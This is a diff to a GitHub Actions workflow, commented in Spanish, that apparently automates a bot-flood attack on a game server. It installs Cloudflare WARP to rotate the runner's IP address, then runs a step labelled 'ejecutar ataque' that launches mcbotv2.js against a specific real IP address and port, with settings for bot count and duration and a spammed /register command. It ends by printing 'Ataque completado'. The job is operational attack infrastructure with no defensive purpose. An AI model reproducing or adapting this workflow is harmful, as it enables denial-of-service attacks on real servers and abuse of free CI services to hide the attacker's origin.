@@ -5,21 +5,28 @@ on:
 jobs:
   anak:
     runs-on: ubuntu-latest
-    timeout-minutes: 1
+    timeout-minutes: 2
     
     steps:
-      - name: Instalar y conectar Cloudflare Warp (para rotar IP)
+      - name: Instalar y activar Cloudflare WARP
         run: |
+          # 1. Agregar repositorio oficial de Cloudflare
           curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
           echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+          
+          # 2. Actualizar e instalar de forma silenciosa
           sudo apt-get update -y
           sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp
+          
+          # 3. Forzar el inicio del demonio en segundo plano
           (sudo nohup warp-svc > /dev/null 2>&1 &)
           sleep 3
+          
+          # 4. Registrar, conectar y verificar IP
           yes | sudo warp-cli --accept-tos registration new
           sudo warp-cli --accept-tos connect
           sudo warp-cli --accept-tos mode warp+doh
-          echo -n "Tu IP final es: "
+          echo -n "Tu IP asignada con VPN es: "
           curl -s ifconfig.me
           echo ""
           
@@ -30,10 +37,10 @@ jobs:
       - name: Entrar y ejecutar ataque
         run: |
           cd ssh2
-          timeout 25 node mcbotv2.js 131.196.198.112 25575 13444 25 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
+          timeout 25 node mcbotv2.js 131.196.198.112 25575 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
           
       - name: Limpiar
         if: always()
         run: |
-          echo "✅ Ataque completado después de 20 segundos"
+          echo "✅ Ataque completado"
           sleep 2
